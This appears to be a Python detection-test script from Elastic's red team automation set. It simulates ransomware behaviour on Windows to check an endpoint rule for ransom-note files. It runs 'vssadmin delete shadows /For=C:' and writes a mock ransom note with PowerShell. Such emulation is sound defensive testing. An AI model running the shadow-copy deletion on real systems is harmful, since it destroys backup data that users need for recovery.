# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="2ab87570-d9ad-40f4-9f52-d5a2942e11ac",
    name="ransomnote_delete_shadows",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[RuleMetadata(id="5dba1130-72df-46f1-b581-18d9c866cb23", name="Potential Ransomware Note File")],
    siem_rules=[],
    techniques=["T1485"],
)
def main():
    vssadmin = "C:\\Windows\\System32\\vssadmin.exe"
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

    # Execute command
    log.info("Deleting Shadow Copies and writing ransom note")
    _ = _common.execute_command([vssadmin, "delete", "shadows", "/For=C:"], timeout_secs=10)

    _ = _common.execute_command([powershell, "/c", "echo 'Ooops! All your' > readme.txt"], timeout_secs=10)
